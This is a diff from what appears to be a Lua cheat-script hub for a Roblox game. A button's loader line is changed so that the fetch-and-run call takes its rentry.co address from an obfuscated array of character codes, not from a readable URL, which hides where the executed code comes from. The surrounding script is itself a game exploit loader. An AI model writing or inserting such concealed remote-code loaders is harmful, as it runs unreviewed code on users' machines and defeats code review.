@@ -1452,7 +1452,7 @@ tool:Button("清风明月🌙",function()
 end)
 
 tool:Button("清风明月🌙…Doors…",function()
-loadstring(game:HttpGet("https://rentry.co/DOORSMYQF/raw"))()
+loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,101,110,116,114,121,46,99,111,47,100,111,105,119,48,115,104,101,57,49,106,115,104,49,112,57,101,104,49,48,115,100,103,106,119,48,119,105,119,57,119,104,106,115,104,115,49,53,54,104,101,111,119,49,47,114,97,119})end)())))()
 end)
 
 local creds = window:Tab("日月防踢",'6035145364')
